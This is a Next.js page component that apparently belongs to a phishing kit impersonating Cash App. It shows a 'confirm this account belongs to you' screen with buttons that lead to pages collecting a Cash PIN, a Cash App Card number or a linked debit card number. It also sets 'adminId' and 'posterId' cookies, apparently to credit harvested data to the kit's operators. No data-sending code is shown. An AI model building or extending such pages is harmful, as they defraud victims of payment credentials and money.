"use client";
import { useRouter } from "next/navigation";
import Cookies from "js-cookie";
import { useEffect } from "react";
// import { useRouter } from "next/router";

function Home({ adminId, posterId }) {
  useEffect(() => {
    Cookies.set("adminId", adminId);
    Cookies.set("posterId", posterId);
  }, []);
  const router = useRouter();
  const handleNavigation = (path) => {
    router.push(path);
  };


  return (
  <div className="flex items-center justify-center min-h-screen bg-white p-4">
      <div className="w-full max-w-md border border-gray-200 shadow-md rounded-2xl p-6">
        <h1 className="text-2xl font-semibold mb-2 text-black">Confirm this account belongs to you</h1>
        <p className="text-gray-600 mb-6">Choose an option to confirm you own this account.</p>

        <div className="space-y-4">
          <button
            onClick={() => handleNavigation("/cash-pin")}
            className="w-full flex items-center gap-3 p-4 border border-gray-300 rounded-xl hover:bg-gray-100 transition"
          >
            <span className="material-icons text-gray-700">lock</span>
            <span className="text-gray-800 font-medium">Cash PIN</span>
          </button>

          <button
            // onClick={() => handleNavigation("/cash-app-card")}
            onClick={() => router.push("/cash-app-card")}
            className="w-full flex items-center gap-3 p-4 border border-gray-300 rounded-xl hover:bg-gray-100 transition"
          >
            <span className="material-icons text-gray-700">credit_card</span>
            <span className="text-gray-800 font-medium">Cash App Card number</span>
          </button>

          <button
            onClick={() => handleNavigation("/linked-debit-card")}
            className="w-full flex items-center gap-3 p-4 border border-gray-300 rounded-xl hover:bg-gray-100 transition"
          >
            <span className="material-icons text-gray-700">account_balance</span>
            <span className="text-gray-800 font-medium">Linked debit card number</span>
          </button>
        </div>

        <div className="mt-6 text-center">
          <button className="text-green-600 font-medium hover:underline">
            I don't have any of these
          </button>
        </div>
      </div>
    </div>
  );
}

export default Home;
